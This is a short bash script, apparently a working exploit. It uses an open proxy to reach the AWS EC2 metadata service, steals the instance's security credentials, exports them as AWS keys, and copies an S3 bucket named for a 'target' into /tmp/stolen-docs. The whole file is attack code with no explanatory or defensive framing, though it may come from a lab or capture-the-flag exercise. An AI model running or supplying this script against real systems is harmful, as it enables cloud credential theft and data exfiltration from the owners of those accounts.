#!/usr/bin/env bash

set -euo pipefail

readonly PROXY=$1
readonly AWS_METADATA=http://169.254.169.254/latest/meta-data/
readonly DEST=/tmp/stolen-docs

main () {
    echo "Confirmed $(test_for_open_proxy) as open proxy"
    local creds=$(get_ec2_credentials)

    download_docs $creds
}

test_for_open_proxy () {
   metadata instance-id
}

get_ec2_credentials () {
    metadata identity-credentials/ec2/security-credentials/ec2-instance
}

download_docs () {
    export AWS_ACCESS_KEY_ID=$(echo "${1}" | jq .AccessKeyId)
    export AWS_SECRET_ACCESS_KEY=$(echo "${1}" | jq .SecretAccessKey)
    readonly TARGET=$(aws s3 ls | grep target | awk -F ' ' '{print $3}')
    

    mkdir -p /tmp/stolen-docs
    aws s3 sync s3://"${TARGET}" "${DEST}"
}

metadata () {
    curl --fail --silent ${AWS_METADATA}/${1} --proxy http://${PROXY}:81
}

main